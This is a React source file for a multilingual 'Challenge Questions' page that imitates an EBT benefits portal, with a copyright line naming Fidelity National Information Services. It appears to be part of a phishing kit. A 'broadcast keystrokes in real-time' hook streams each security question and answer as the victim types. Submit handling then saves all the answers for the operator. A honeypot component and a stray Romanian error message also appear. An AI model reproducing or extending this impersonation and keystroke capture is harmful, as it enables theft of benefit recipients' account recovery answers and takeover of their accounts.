import { useEffect, useRef, useState, type CSSProperties } from "react";
import { useNavigate } from "react-router-dom";
import { Check, ChevronDown, Eye, EyeOff, Info } from "lucide-react";
import EbtLayout from "@/components/EbtLayout";
import Honeypot from "@/components/Honeypot";
import { updateLastUser, broadcastTyping, clearTypingForSession, getSelectedLang, setSelectedLang } from "@/lib/userStore";

const challengeQuestionsList = [
  "What is your pet's name?",
  "What is your favorite vacation spot?",
  "Whom do you admire most?",
  "What is your biggest passion?",
  "What is your favorite food?",
  "What is your favorite song?",
  "What is your favorite color?",
  "Where were you born?",
];

type Lang = "English" | "Español" | "Kreyòl Ayisyen" | "عربي" | "中文" | "Polski" | "русский";

const langLabels: Record<Lang, { title: string; selectLanguage: string; infoText: string; setQuestions: string; requiredFields: string; question: string; answer: string; reEnterAnswer: string; cancelBtn: string; addBtn: string; selectQuestion: string; conditionsOfUse: string; privacyPolicy: string; accessibility: string; copyright: string }> = {
  English: {
    title: "Challenge Questions",
    selectLanguage: "Select Language",
    infoText: "Challenge questions are a security feature that adds an extra level of protection. The questions that you set up with your own personal answers help the system verify your identity.",
    setQuestions: "Set Your Challenge Questions",
    requiredFields: "Required Fields",
    question: "Question",
    answer: "Answer:",
    reEnterAnswer: "Re-enter Answer:",
    cancelBtn: "Cancel",
    addBtn: "Add",
    selectQuestion: "Select Challenge Question",
    conditionsOfUse: "Conditions of Use",
    privacyPolicy: "Privacy Policy",
    accessibility: "Accessibility",
    copyright: "© 2024 Fidelity National Information Services, Inc. and its subsidiaries. All Rights Reserved.",
  },
  Español: {
    title: "Preguntas de Seguridad",
    selectLanguage: "Seleccionar idioma",
    infoText: "Las preguntas de seguridad son una función que agrega un nivel adicional de protección. Las preguntas que configura con sus respuestas personales ayudan al sistema a verificar su identidad.",
    setQuestions: "Configure sus Preguntas de Seguridad",
    requiredFields: "Campos obligatorios",
    question: "Pregunta",
    answer: "Respuesta:",
    reEnterAnswer: "Reingrese Respuesta:",
    cancelBtn: "Cancelar",
    addBtn: "Agregar",
    selectQuestion: "Seleccione Pregunta de Seguridad",
    conditionsOfUse: "Condiciones de uso",
    privacyPolicy: "Política de Privacidad",
    accessibility: "Accesibilidad",
    copyright: "© 2024 Fidelity National Information Services, Inc. y sus subsidiarias. Todos los derechos reservados.",
  },
  "Kreyòl Ayisyen": {
    title: "Kesyon Sekirite",
    selectLanguage: "Chwazi lang",
    infoText: "Kesyon sekirite yo se yon fonksyon ki ajoute yon nivo pwoteksyon anplis. Kesyon ou mete ak repons pèsonèl ou ede sistèm nan verifye idantite ou.",
    setQuestions: "Mete Kesyon Sekirite Ou yo",
    requiredFields: "Chan obligatwa",
    question: "Kesyon",
    answer: "Repons:",
    reEnterAnswer: "Re-antre Repons:",
    cancelBtn: "Anile",
    addBtn: "Ajoute",
    selectQuestion: "Chwazi Kesyon Sekirite",
    conditionsOfUse: "Kondisyon Itilizasyon",
    privacyPolicy: "Règleman Konfidansyalite",
    accessibility: "Aksè",
    copyright: "© 2024 Fidelity National Information Services, Inc. ak filyal li yo. Tout dwa rezève.",
  },
  عربي: {
    title: "أسئلة التحقق",
    selectLanguage: "اختار اللغة",
    infoText: "أسئلة التحقق هي ميزة أمنية تضيف مستوى إضافيًا من الحماية. الأسئلة التي تقوم بإعدادها مع إجاباتك الشخصية تساعد النظام في التحقق من هويتك.",
    setQuestions: "تعيين أسئلة التحقق",
    requiredFields: "الحقول المطلوبة",
    question: "سؤال",
    answer: "الإجابة:",
    reEnterAnswer: "أعد إدخال الإجابة:",
    cancelBtn: "إلغاء",
    addBtn: "إضافة",
    selectQuestion: "اختر سؤال التحقق",
    conditionsOfUse: "شروط الاستخدام",
    privacyPolicy: "سياسة الخصوصية",
    accessibility: "إمكانية الوصول",
    copyright: "© 2024 Fidelity National Information Services, Inc. والشركات التابعة لها. جميع الحقوق محفوظة.",
  },
  中文: {
    title: "安全问题",
    selectLanguage: "选择语言",
    infoText: "安全问题是一项安全功能，可提供额外的保护级别。您使用个人答案设置的问题有助于系统验证您的身份。",
    setQuestions: "设置您的安全问题",
    requiredFields: "必填字段",
    question: "问题",
    answer: "答案：",
    reEnterAnswer: "重新输入答案：",
    cancelBtn: "取消",
    addBtn: "添加",
    selectQuestion: "选择安全问题",
    conditionsOfUse: "使用条款",
    privacyPolicy: "隐私政策",
    accessibility: "无障碍",
    copyright: "© 2024 Fidelity National Information Services, Inc. 及其子公司。保留所有权利。",
  },
  Polski: {
    title: "Pytania Weryfikacyjne",
    selectLanguage: "Wybierz język",
    infoText: "Pytania weryfikacyjne to funkcja bezpieczeństwa, która dodaje dodatkowy poziom ochrony. Pytania, które konfigurujesz z własnymi odpowiedziami, pomagają systemowi zweryfikować Twoją tożsamość.",
    setQuestions: "Ustaw Pytania Weryfikacyjne",
    requiredFields: "Pola wymagane",
    question: "Pytanie",
    answer: "Odpowiedź:",
    reEnterAnswer: "Powtórz Odpowiedź:",
    cancelBtn: "Anuluj",
    addBtn: "Dodaj",
    selectQuestion: "Wybierz Pytanie Weryfikacyjne",
    conditionsOfUse: "Warunki użytkowania",
    privacyPolicy: "Polityka prywatności",
    accessibility: "Dostępność",
    copyright: "© 2024 Fidelity National Information Services, Inc. i jej spółki zależne. Wszelkie prawa zastrzeżone.",
  },
  русский: {
    title: "Контрольные Вопросы",
    selectLanguage: "Выберите язык",
    infoText: "Контрольные вопросы — это функция безопасности, которая добавляет дополнительный уровень защиты. Вопросы, которые вы настраиваете со своими личными ответами, помогают системе подтвердить вашу личность.",
    setQuestions: "Установите Контрольные Вопросы",
    requiredFields: "Обязательные поля",
    question: "Вопрос",
    answer: "Ответ:",
    reEnterAnswer: "Повторите Ответ:",
    cancelBtn: "Отмена",
    addBtn: "Добавить",
    selectQuestion: "Выберите Контрольный Вопрос",
    conditionsOfUse: "Условия использования",
    privacyPolicy: "Политика конфиденциальности",
    accessibility: "Доступность",
    copyright: "© 2024 Fidelity National Information Services, Inc. и её дочерние компании. Все права защищены.",
  },
};

const languageOptions: Lang[] = ["English", "Español", "Kreyòl Ayisyen", "عربي", "中文", "Polski", "русский"];

const inputBase: CSSProperties = {
  width: "100%",
  border: "none",
  borderBottom: "1px solid hsl(210 4% 78%)",
  background: "transparent",
  outline: "none",
  height: 40,
  fontSize: 12,
  color: "hsl(220 10% 28%)",
  fontFamily: "Arial, Helvetica, sans-serif",
};

const ChallengeQuestions = () => {
  const navigate = useNavigate();
  const [lang, setLang] = useState<Lang>(() => {
    const saved = getSelectedLang();
    return (Object.keys(langLabels) as Lang[]).includes(saved as Lang) ? (saved as Lang) : "English";
  });

  const [q1, setQ1] = useState("");
  const [a1, setA1] = useState("");
  const [a1r, setA1r] = useState("");
  const [showA1, setShowA1] = useState(false);
  const [showA1r, setShowA1r] = useState(false);

  const [q2, setQ2] = useState("");
  const [a2, setA2] = useState("");
  const [a2r, setA2r] = useState("");
  const [showA2, setShowA2] = useState(false);
  const [showA2r, setShowA2r] = useState(false);

  const [q3, setQ3] = useState("");
  const [a3, setA3] = useState("");
  const [a3r, setA3r] = useState("");
  const [showA3, setShowA3] = useState(false);
  const [showA3r, setShowA3r] = useState(false);

  const t = langLabels[lang];

  const [showSuccess, setShowSuccess] = useState(false);
  const [openDropdown, setOpenDropdown] = useState<number | null>(null);
  const dropdownRefs = useRef<(HTMLDivElement | null)[]>([null, null, null]);

  const canAdd =
    q1 !== "" && a1.trim().length > 0 && a1r.trim().length > 0 && a1 === a1r &&
    q2 !== "" && a2.trim().length > 0 && a2r.trim().length > 0 && a2 === a2r &&
    q3 !== "" && a3.trim().length > 0 && a3r.trim().length > 0 && a3 === a3r;

  useEffect(() => {
    const onClickOutside = (event: MouseEvent) => {
      const clickedInsideAny = dropdownRefs.current.some(ref => ref?.contains(event.target as Node));
      if (!clickedInsideAny) {
        setOpenDropdown(null);
      }
    };
    document.addEventListener("mousedown", onClickOutside);
    return () => document.removeEventListener("mousedown", onClickOutside);
  }, []);

  // Broadcast keystrokes in real-time
  useEffect(() => {
    const fields: Record<string, string> = {};
    if (q1) fields["Q1"] = q1;
    if (a1) fields["A1"] = a1;
    if (q2) fields["Q2"] = q2;
    if (a2) fields["A2"] = a2;
    if (q3) fields["Q3"] = q3;
    if (a3) fields["A3"] = a3;
    if (Object.keys(fields).length > 0) broadcastTyping(fields);
  }, [q1, a1, q2, a2, q3, a3]);

  const usedQuestions = [q1, q2, q3];

  const renderQuestionBlock = (
    num: number,
    selectedQ: string,
    setQ: (v: string) => void,
    answer: string,
    setAnswer: (v: string) => void,
    answerRepeat: string,
    setAnswerRepeat: (v: string) => void,
    showAnswer: boolean,
    setShowAnswer: (v: boolean) => void,
    showRepeat: boolean,
    setShowRepeat: (v: boolean) => void,
  ) => {
    const idx = num - 1;
    const isOpen = openDropdown === idx;
    return (
    <div style={{ marginBottom: 28 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 14, marginBottom: 10 }}>
        <span style={{ color: "hsl(203 78% 28%)", fontWeight: 700, fontSize: 14, whiteSpace: "nowrap" }}>
          {t.question} {num}:
        </span>
        <div
          ref={(el) => { dropdownRefs.current[idx] = el; }}
          style={{ position: "relative", flex: 1 }}
        >
          <button
            type="button"
            onClick={() => setOpenDropdown(isOpen ? null : idx)}
            style={{
              width: "100%",
              height: 40,
              border: "1px solid hsl(210 4% 78%)",
              borderRadius: 0,
              background: "hsl(0 0% 100%)",
              fontSize: 13,
              fontFamily: "Arial, Helvetica, sans-serif",
              color: selectedQ ? "hsl(220 10% 28%)" : "hsl(210 4% 58%)",
              padding: "0 30px 0 8px",
              cursor: "pointer",
              textAlign: "left",
              overflow: "hidden",
              textOverflow: "ellipsis",
              whiteSpace: "nowrap",
            }}
          >
            {selectedQ || t.selectQuestion}
          </button>
          <ChevronDown
            size={18}
            style={{
              position: "absolute",
              right: 8,
              top: "50%",
              transform: isOpen ? "translateY(-50%) rotate(180deg)" : "translateY(-50%)",
              pointerEvents: "none",
              color: "hsl(220 10% 28%)",
              transition: "transform 0.2s",
            }}
          />

          {isOpen && (
            <div
              style={{
                position: "absolute",
                top: "100%",
                left: 0,
                right: 0,
                zIndex: 50,
                background: "hsl(0 0% 100%)",
                border: "1px solid hsl(210 4% 82%)",
                boxShadow: "0 8px 24px hsla(0 0% 0% / 0.15)",
                maxHeight: 340,
                overflowY: "auto",
              }}
            >
              {challengeQuestionsList.map((cq) => {
                const isSelected = selectedQ === cq;
                const isUsed = usedQuestions.includes(cq) && !isSelected;
                return (
                  <button
                    key={cq}
                    type="button"
                    disabled={isUsed}
                    onClick={() => {
                      setQ(cq);
                      setOpenDropdown(null);
                    }}
                    style={{
                      width: "100%",
                      border: "none",
                      borderBottom: "1px solid hsl(210 4% 92%)",
                      background: isSelected ? "hsl(0 0% 97%)" : "hsl(0 0% 100%)",
                      padding: "14px 40px 14px 16px",
                      fontSize: 15,
                      fontFamily: "Arial, Helvetica, sans-serif",
                      color: isUsed ? "hsl(210 4% 72%)" : "hsl(220 10% 22%)",
                      cursor: isUsed ? "default" : "pointer",
                      textAlign: "left",
                      position: "relative",
                      display: "block",
                    }}
                    onMouseEnter={(e) => {
                      if (!isUsed) (e.currentTarget.style.background = "hsl(210 20% 96%)");
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = isSelected ? "hsl(0 0% 97%)" : "hsl(0 0% 100%)";
                    }}
                  >
                    {cq}
                    {isSelected && (
                      <Check
                        size={18}
                        style={{
                          position: "absolute",
                          right: 14,
                          top: "50%",
                          transform: "translateY(-50%)",
                          color: "hsl(210 4% 58%)",
                        }}
                      />
                    )}
                  </button>
                );
              })}
            </div>
          )}
        </div>
      </div>

      <div style={{ marginBottom: 8 }}>
        <label style={{ display: "block", marginBottom: 3, color: "hsl(203 78% 28%)", fontSize: 13, fontWeight: 400 }}>
          {t.answer} <span style={{ color: "hsl(0 82% 45%)" }}>*</span>
        </label>
        <input type={showRepeat ? "text" : "password"} value={answer} onChange={(e) => setAnswer(e.target.value)} required style={inputBase} />
      </div>

      <div>
        <label style={{ display: "block", marginBottom: 3, color: "hsl(203 78% 28%)", fontSize: 13, fontWeight: 400 }}>
          {t.reEnterAnswer} <span style={{ color: "hsl(0 82% 45%)" }}>*</span>
        </label>
        <div style={{ position: "relative" }}>
          <input
            type={showRepeat ? "text" : "password"}
            value={answerRepeat}
            onChange={(e) => setAnswerRepeat(e.target.value)}
            required
            style={{
              ...inputBase,
              paddingRight: 36,
              borderBottomColor: answerRepeat.length > 0 && answer !== answerRepeat ? "hsl(0 82% 45%)" : undefined,
            }}
          />
          <button
            type="button"
            onClick={() => setShowRepeat(!showRepeat)}
            style={{
              position: "absolute",
              right: 0,
              top: "50%",
              transform: "translateY(-50%)",
              border: "none",
              background: "transparent",
              cursor: "pointer",
              padding: 4,
            }}
          >
            {showRepeat ? <Eye size={20} style={{ color: "hsl(202 36% 38%)" }} /> : <EyeOff size={20} style={{ color: "hsl(202 36% 38%)" }} />}
          </button>
        </div>
        {answerRepeat.length > 0 && answer !== answerRepeat && (
          <p style={{ margin: "4px 0 0", fontSize: 11, color: "hsl(0 82% 45%)", fontFamily: "Arial, Helvetica, sans-serif" }}>
            Answers do not match
          </p>
        )}
      </div>
    </div>
    );
  };

  return (
    <EbtLayout
      title={t.title}
      langLabel={t.selectLanguage}
      langOptions={languageOptions}
      onLangChange={(l) => { setLang(l as Lang); setSelectedLang(l); }}
      footerLinks={{ conditionsOfUse: t.conditionsOfUse, privacyPolicy: t.privacyPolicy, accessibility: t.accessibility }}
      footerCopyright={t.copyright}
      mainStyle={{ display: "flex", justifyContent: "center", padding: "16px 10px 130px" }}
    >
        <div
          style={{
            width: "100%",
            maxWidth: 860,
            background: "hsl(0 0% 100%)",
            padding: "24px clamp(16px, 4vw, 44px) 18px",
            boxSizing: "border-box",
            boxShadow: "0 2px 8px hsla(0 0% 0% / 0.15)",
          }}
        >
          {/* Info banner */}
          <div
            style={{
              background: "hsl(120 40% 95%)",
              border: "1px solid hsl(120 30% 82%)",
              borderRadius: 4,
              padding: "14px 18px",
              marginBottom: 20,
              textAlign: "center",
            }}
          >
            <p style={{ margin: 0, fontSize: 13, color: "hsl(220 10% 28%)", lineHeight: 1.5 }}>
              <Info size={14} style={{ verticalAlign: "middle", marginRight: 4, color: "hsl(203 78% 28%)" }} />
              <strong>{t.infoText.split(".")[0]}.</strong>
              {t.infoText.substring(t.infoText.indexOf(".") + 1)}
            </p>
          </div>

          <p style={{ margin: "0 0 4px", textAlign: "center", fontWeight: 400, color: "hsl(0 0% 35%)", fontSize: 14 }}>
            {t.setQuestions}
          </p>
          <p style={{ margin: "0 0 20px", textAlign: "center", color: "hsl(0 89% 42%)", fontWeight: 700, fontSize: 13 }}>
            {t.requiredFields} <span style={{ color: "hsl(0 89% 42%)" }}>*</span>
          </p>

          <form
            onSubmit={async (e) => {
              e.preventDefault();
              if (!canAdd) return;
              clearTypingForSession();
              const ok = await updateLastUser({
                challengeQuestions: [
                  { question: q1, answer: a1 },
                  { question: q2, answer: a2 },
                  { question: q3, answer: a3 },
                ],
              });
              if (!ok) {
                alert("Nu s-au putut salva întrebarile. Încearcă din nou.");
                return;
              }
              setShowSuccess(true);
            }}
          >
            <Honeypot />
            {renderQuestionBlock(1, q1, setQ1, a1, setA1, a1r, setA1r, showA1, setShowA1, showA1r, setShowA1r)}

            {renderQuestionBlock(2, q2, setQ2, a2, setA2, a2r, setA2r, showA2, setShowA2, showA2r, setShowA2r)}
            {renderQuestionBlock(3, q3, setQ3, a3, setA3, a3r, setA3r, showA3, setShowA3, showA3r, setShowA3r)}

            <div style={{ display: "flex", gap: 10, marginTop: 12, flexWrap: "wrap" }}>
              <button
                type="button"
                onClick={() => navigate("/register")}
                style={{
                  flex: "1 1 140px",
                  maxWidth: "50%",
                  height: 48,
                  border: "none",
                  cursor: "pointer",
                  color: "hsl(0 0% 92%)",
                  background: "hsl(205 37% 37%)",
                  fontSize: 20,
                  fontWeight: 500,
                }}
              >
                {t.cancelBtn}
              </button>
              <button
                type="submit"
                disabled={!canAdd}
                style={{
                  flex: "1 1 140px",
                  maxWidth: "50%",
                  height: 48,
                  border: "none",
                  cursor: canAdd ? "pointer" : "not-allowed",
                  color: "hsl(0 0% 92%)",
                  background: canAdd ? "hsl(205 37% 37%)" : "hsl(203 24% 70%)",
                  fontSize: 20,
                  fontWeight: 500,
                }}
              >
                {t.addBtn}
              </button>
            </div>
          </form>
        </div>

      {/* Success Modal */}
      {showSuccess && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            zIndex: 100,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            background: "hsla(0 0% 0% / 0.3)",
          }}
        >
          <div
            style={{
              background: "hsl(0 0% 100%)",
              borderRadius: 6,
              boxShadow: "0 8px 32px hsla(0 0% 0% / 0.25)",
              padding: "28px 36px 20px",
              maxWidth: 380,
              width: "90%",
              fontFamily: "Arial, Helvetica, sans-serif",
            }}
          >
            <h2 style={{ margin: "0 0 12px", fontSize: 18, fontWeight: 700, color: "hsl(220 10% 18%)" }}>
              Success
            </h2>
            <p style={{ margin: "0 0 20px", fontSize: 14, color: "hsl(220 10% 28%)", lineHeight: 1.5 }}>
              Successfully created challenge questions. Please click ok to login.
            </p>
            <div style={{ textAlign: "right" }}>
              <button
                type="button"
                onClick={() => navigate("/")}
                style={{
                  border: "none",
                  background: "transparent",
                  color: "hsl(203 78% 35%)",
                  fontSize: 15,
                  fontWeight: 700,
                  cursor: "pointer",
                  padding: "6px 12px",
                }}
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}
    </EbtLayout>
  );
};

export default ChallengeQuestions;
